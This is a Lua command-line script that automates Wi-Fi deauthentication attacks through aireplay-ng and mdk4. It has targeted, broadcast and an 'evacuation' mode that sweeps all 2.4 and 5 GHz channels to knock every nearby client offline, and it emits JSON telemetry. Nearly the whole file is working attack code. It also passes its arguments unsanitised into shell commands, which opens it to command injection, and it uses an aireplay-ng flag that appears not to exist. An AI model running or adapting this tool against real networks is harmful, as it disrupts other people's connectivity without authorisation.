#!/usr/bin/env lua

local iface = arg[1]
local bssid = arg[2]
local station = arg[3] or "ff:ff:ff:ff:ff:ff"
local count = tonumber(arg[4]) or 10
local rate = tonumber(arg[5]) or 100
local mode = arg[6] or "targeted"

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":' .. json_escape(bssid) .. ',"ssid":"","channel":"","data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local cmd = "iw dev " .. iface .. " info 2>/dev/null"
  local f = io.popen(cmd)
  if not f then return false end
  local out = f:read("*a")
  f:close()
  if out:find("type monitor") then
    telemetry("monitor_ok", '{"message":"Monitor mode confirmed"}')
    return true
  end
  telemetry("monitor_fail", '{"message":"Interface not in monitor mode"}')
  return false
end

local function set_channel(ch)
  os.execute("iw dev " .. iface .. " set channel " .. ch .. " 2>/dev/null")
  telemetry("channel_set", '{"channel":' .. tostring(ch) .. '}')
end

local function targeted_deauth()
  telemetry("deauth_mode", '{"mode":"targeted","bssid":' .. json_escape(bssid) .. ',"station":' .. json_escape(station) .. '}')
  local cmd = "aireplay-ng --deauth " .. count .. " -a " .. bssid
  if station ~= "ff:ff:ff:ff:ff:ff" then
    cmd = cmd .. " -c " .. station
  end
  cmd = cmd .. " --essid-rate " .. rate .. " " .. iface .. " 2>/dev/null"
  telemetry("deauth_cmd", '{"cmd":' .. json_escape(cmd) .. '}')
  local f = io.popen(cmd)
  if not f then return false end
  local sent = 0
  while true do
    local line = f:read("*l")
    if not line then break end
    if line:find("Deauth") or line:find("deauth") then
      sent = sent + 1
      telemetry("deauth_sent", '{"method":"aireplay","rate":' .. tostring(rate) .. ',"sent":' .. tostring(sent) .. '}')
    end
  end
  f:close()
  telemetry("deauth_complete", '{"type":"targeted","sent":' .. tostring(sent) .. '}')
  return sent > 0
end

local function broadcast_deauth()
  telemetry("deauth_mode", '{"mode":"broadcast","bssid":' .. json_escape(bssid) .. '}')
  local cmd = "mdk4 " .. iface .. " d -a " .. bssid .. " -s " .. tostring(count) .. " 2>/dev/null"
  telemetry("deauth_cmd", '{"cmd":' .. json_escape(cmd) .. '}')
  local f = io.popen(cmd)
  if not f then return false end
  local sent = 0
  while true do
    local line = f:read("*l")
    if not line then break end
    if line:find("Packet") then sent = sent + 1 end
  end
  f:close()
  telemetry("deauth_complete", '{"type":"broadcast","sent":' .. tostring(sent) .. '}')
  return sent > 0
end

local function evacuation_attack()
  telemetry("deauth_mode", '{"mode":"evacuation"}')
  local channels = {1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140}
  local total_sent = 0
  for _, ch in ipairs(channels) do
    set_channel(ch)
    local cmd = "aireplay-ng --deauth 3 -a ff:ff:ff:ff:ff:ff " .. iface .. " 2>/dev/null"
    local f = io.popen(cmd)
    if f then
      while true do
        local line = f:read("*l")
        if not line then break end
        if line:find("Deauth") then total_sent = total_sent + 1 end
      end
      f:close()
    end
    telemetry("evacuation_channel", '{"channel":' .. tostring(ch) .. ',"total_sent":' .. tostring(total_sent) .. '}')
  end
  telemetry("deauth_complete", '{"type":"evacuation","channels_scanned":' .. tostring(#channels) .. ',"total_sent":' .. tostring(total_sent) .. '}')
  return total_sent > 0
end

if arg[1] == "--help" then
  print("Usage: deauth_advanced.lua <interface> <bssid> [station] [count] [rate] [mode]")
  print("Advanced deauth with rate control. Modes: targeted, broadcast, evacuation")
  print("Example: deauth_advanced.lua wlan0 00:11:22:33:44:55 ff:ff:ff:ff:ff:ff 10 200 targeted")
  os.exit(0)
end

if not iface or not bssid then
  telemetry("error", '{"error":"Usage: deauth_advanced.lua <interface> <bssid> [station] [count] [rate] [mode]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Monitor mode required on ' .. iface .. '"}')
  os.exit(1)
end

telemetry("deauth_start", '{"count":' .. tostring(count) .. ',"rate":' .. tostring(rate) .. ',"mode":' .. json_escape(mode) .. '}')

if mode == "evacuation" then
  evacuation_attack()
elseif mode == "broadcast" then
  broadcast_deauth()
else
  targeted_deauth()
end

telemetry("complete", '{"mode":' .. json_escape(mode) .. '}')
